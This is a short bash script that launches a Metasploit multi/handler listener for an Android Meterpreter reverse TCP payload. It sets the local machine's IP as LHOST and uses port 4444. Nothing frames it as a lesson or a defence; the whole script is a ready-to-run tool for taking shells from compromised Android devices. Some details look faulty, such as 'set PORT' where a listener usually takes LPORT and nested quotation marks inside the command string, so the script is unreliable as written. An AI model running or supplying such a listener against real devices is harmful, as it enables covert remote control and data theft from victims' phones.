#!/bin/bash

myIp="$(hostname -I | cut -f1 -d' ')"

msfconsole -q -x "use exploit/multi/handler;
		  set payload android/meterpreter/reverse_tcp;
		  set LHOST "${myIp}";
		  set PORT 4444;
		  exploit;"

echo "LHOST IP set to: "  $myIp
echo "Listener is cnfigured for reverse_tcp"
